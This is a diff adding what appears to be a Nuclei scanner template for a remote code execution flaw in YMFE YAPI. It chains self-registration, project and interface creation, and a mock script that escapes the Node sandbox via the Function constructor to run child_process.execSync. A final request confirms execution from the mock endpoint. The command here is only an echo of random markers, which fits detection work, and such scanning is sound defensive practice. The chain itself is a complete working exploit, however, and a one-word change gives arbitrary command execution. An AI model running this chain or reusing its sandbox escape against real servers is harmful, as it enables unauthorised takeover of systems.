@@ -1,0 +1,171 @@
+id: ymfe-yapi-rce
+info:
+  name: YMFE YAPI Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Exploits a remote code execution vulnerability in YMFE YAPI by chaining multiple requests.
+  reference:
+    - https://www.jianshu.com/p/b1f79f346eca
+variables:
+  redemail: "{{rand_text_alphanumeric(15)}}"
+  redpassword: "{{rand_text_alphanumeric(15)}}"
+  redproject: "{{rand_text_alphanumeric(8)}}"
+  redinterface: "{{rand_text_alphanumeric(10)}}"
+  r1: "{{rand_text_alphanumeric(10)}}"
+  r2: "{{rand_text_alphanumeric(10)}}"
+  r3: "{{rand_text_alphanumeric(10)}}"
+  r4: "{{rand_text_alphanumeric(10)}}"
+flow: |
+  http(1) && http(2) && http(3) && http(4) && http(5) && http(6) && http(7)
+http:
+  - id: registration
+    raw:
+      - |
+        POST /api/user/reg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"email":"{{redemail}}@qq.com","password":"{{redpassword}}","username":"{{redemail}}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: header
+        words:
+          - "_yapi_token="
+          - "_yapi_uid="
+      - type: word
+        part: body
+        words:
+          - "{{redemail}}"
+  - id: group-list
+    raw:
+      - |
+        GET /api/group/list HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "custom_field1"
+    extractors:
+      - type: regex
+        name: group_id
+        group: 1
+        regex:
+          - '"_id":([^,]+),'
+  - id: add-project
+    raw:
+      - |
+        POST /api/project/add HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"name":"{{redproject}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "成功！"
+          - "{{redproject}}"
+    extractors:
+      - type: regex
+        name: project_id
+        group: 1
+        regex:
+          - '"tag":\[\],"_id":([^,]+),'
+  - id: get-project
+    raw:
+      - |
+        GET /api/project/get?id={{project_id}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "成功！"
+    extractors:
+      - type: regex
+        name: catid
+        group: 1
+        regex:
+          - '"_id":([^,]+),'
+  - id: add-interface
+    raw:
+      - |
+        POST /api/interface/add HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"method":"GET","catid":"{{catid}}","title":"{{redinterface}}","path":"/{{redinterface}}","project_id":{{project_id}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "成功！"
+          - "{{redinterface}}"
+    extractors:
+      - type: regex
+        name: interface_id
+        group: 1
+        regex:
+          - '"_id":([^,]+),'
+  - id: save-mock
+    raw:
+      - |
+        POST /api/plugin/advmock/save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"echo {{r1}}${{{r2}}}{{r3}}^{{r4}}\").toString()","enable":true}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "成功！"
+  - id: execute-mock
+    raw:
+      - |
+        GET /mock/{{project_id}}/{{redinterface}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "{{r1}}{{r3}}^{{r4}}"
+          - "{{r1}}${{{r2}}}{{r3}}{{r4}}"
+  - id: delete-project
+    raw:
+      - |
+        POST /api/project/del HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"id":{{project_id}}}
+    matchers:
+      - type: status
+        status: [200]
